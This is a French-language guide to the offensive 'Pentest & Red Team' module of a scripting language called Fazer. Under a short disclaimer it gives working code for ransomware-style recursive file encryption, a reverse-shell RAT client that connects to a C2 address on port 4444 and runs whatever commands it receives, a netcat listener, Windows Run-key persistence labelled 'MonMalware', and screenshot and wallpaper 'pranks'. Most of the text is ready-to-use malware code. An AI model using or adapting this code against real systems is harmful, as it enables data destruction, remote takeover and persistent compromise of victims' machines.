# Guide de Développement Pentest & Red Team avec Fazer

> **AVERTISSEMENT** : Ce module est destiné à des fins éducatives et de test de sécurité autorisé uniquement. L'auteur décline toute responsabilité en cas d'utilisation malveillante.

Fazer intègre des fonctionnalités natives puissantes permettant de développer des outils de sécurité offensive (Red Team), de simulation de malware (Ransomware, RAT) et d'administration système avancée.

## 1. Simulation de Ransomware (Crypto)

Fazer utilise le chiffrement **AES-256-CBC** pour sécuriser les fichiers.

### API
*   `encrypt_file(path, key)` : Chiffre un fichier. Génère un fichier `.enc` avec l'IV préfixé.
*   `decrypt_file(path, key)` : Déchiffre un fichier `.enc`.
*   `walk_dir(path)` : Liste récursivement tous les fichiers d'un dossier.

### Exemple
```fazer
key := "MA_CLE_SECURE_256_BITS"
files := walk_dir("C:\\Documents\\Confidentiel")

# Chiffrer tout
i := 0
while i < files.length ->
    encrypt_file(files[i], key)
    i := i + 1
end
```

## 2. Remote Access Trojan (RAT) / Reverse Shell

Vous pouvez créer des clients TCP capables de recevoir des commandes distantes et d'exécuter du code.

### API
*   `tcp_connect(host, port, handler)` : Se connecte à un serveur C2 (Command & Control).
    *   `handler` : Une fonction qui reçoit les données brutes (commandes).
    *   Retourne un objet client avec `.send(data)` et `.close()`.

### Exemple (Client)
```fazer
fn on_data(cmd) ->
    # Exécuter la commande reçue dans le shell système
    result := exec(cmd)
    return result
end

client := tcp_connect("192.168.1.10", 4444, on_data)
client.send("Bot connecté !\n")
```

Pour tester, lancez un listener Netcat sur votre machine attaquante : `nc -lvp 4444`.

## 3. Persistance et Registre (Windows)

Manipulez le registre Windows pour assurer la persistance de vos outils au démarrage.

### API
*   `registry_get(key, name)` : Lit une valeur du registre.
*   `registry_set(key, name, value)` : Écrit une valeur (String).

### Exemple (Run Key)
```fazer
key := "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
registry_set(key, "MonMalware", "C:\\Chemin\\vers\\app.exe")
```

## 4. Pranks & Divers

*   `set_wallpaper(path)` : Change le fond d'écran (Windows uniquement).
*   `screenshot(path)` : Prend une capture d'écran.

```fazer
set_wallpaper("C:\\hacked.jpg")
screenshot("capture.png")
```
